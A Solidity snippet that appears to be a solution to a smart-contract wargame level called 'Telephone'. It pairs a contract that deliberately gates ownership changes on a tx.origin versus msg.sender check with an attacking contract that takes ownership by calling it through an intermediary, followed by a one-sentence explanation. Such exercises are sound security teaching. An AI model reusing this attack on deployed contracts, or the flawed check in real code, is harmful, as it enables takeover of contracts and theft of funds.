```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Telephone {

  address public owner;

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}

contract CallTelephone {
  constructor() public {}

  function changeOwner(address _contractAddress) public {
    Telephone telephone = Telephone(_contractAddress);
    telephone.changeOwner(msg.sender);
  }
}
```

tx.origin is the address of the account calling the changeOwner and msg.sender is the address of the CallTelephone contract so ownership is changed to the account initiating the changeOwner call.